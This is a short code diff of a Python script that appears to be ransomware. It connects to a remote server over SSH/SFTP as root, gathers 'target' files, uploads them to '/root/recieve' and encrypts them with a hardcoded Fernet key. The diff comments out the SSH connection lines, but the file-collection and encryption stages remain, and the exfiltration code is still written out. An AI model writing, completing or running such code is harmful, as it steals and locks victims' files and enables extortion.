@@ -4,10 +4,10 @@ import paramiko
 from cryptography.fernet import Fernet
 
 # ssh server
-ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-ssh.connect(hostname='', username='root', password='', port=22)
-sftp_client=ssh.open_sftp()
+#ssh = paramiko.SSHClient()
+#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+#ssh.connect(hostname='', username='root', password='', port=22)
+#sftp_client=ssh.open_sftp()
 
 # find targets
 targets = []
@@ -30,8 +30,8 @@ key = b'Fzh0I3_PYxI2nZqLjLJEOMDoROxG-Op-AQRNymU110Y='
 #sftp_client.put('militech.txt', '/root/recieve/militech.txt')
 #for target in targets:
 #       sftp_client.put(target, '/root/recieve'+target)
-sftp_client.close()
-ssh.close()
+#sftp_client.close()
+#ssh.close()
 
 # encrypt targets
 for target in targets:
